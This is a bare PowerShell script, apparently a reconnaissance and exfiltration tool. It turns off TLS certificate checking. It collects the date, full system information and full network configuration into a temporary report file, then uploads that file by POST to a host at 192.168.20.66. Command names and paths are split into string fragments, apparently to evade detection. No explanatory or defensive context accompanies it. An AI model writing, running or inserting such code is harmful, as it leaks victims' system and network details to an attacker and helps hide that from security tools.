Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class T : ICertificatePolicy {
public bool CheckValidationResult(ServicePoint s,X509Certificate c,WebRequest r,int p){return true;}
}
"@
[Net.ServicePointManager]::CertificatePolicy = New-Object T

$h = "$env:T"+"EMP\rep"+"ort.txt"
$z = ("https://"+"192.168.20.66"+"/upl"+"oad")

"=D=" | Out-File $h -Encoding UTF8
(&('da'+'te')) | Out-File $h -Append -Encoding UTF8

"`n=S=" | Out-File $h -Append -Encoding UTF8
(&('syste'+'minfo')) | Out-File $h -Append -Encoding UTF8

"`n=I=" | Out-File $h -Append -Encoding UTF8
(&('ipco'+'nfig') '/all') | Out-File $h -Append -Encoding UTF8

(&('Invoke-Rest'+'Method') -Uri $z -Method Post -InFile $h -ContentType "text/plain" -UseBasicParsing)
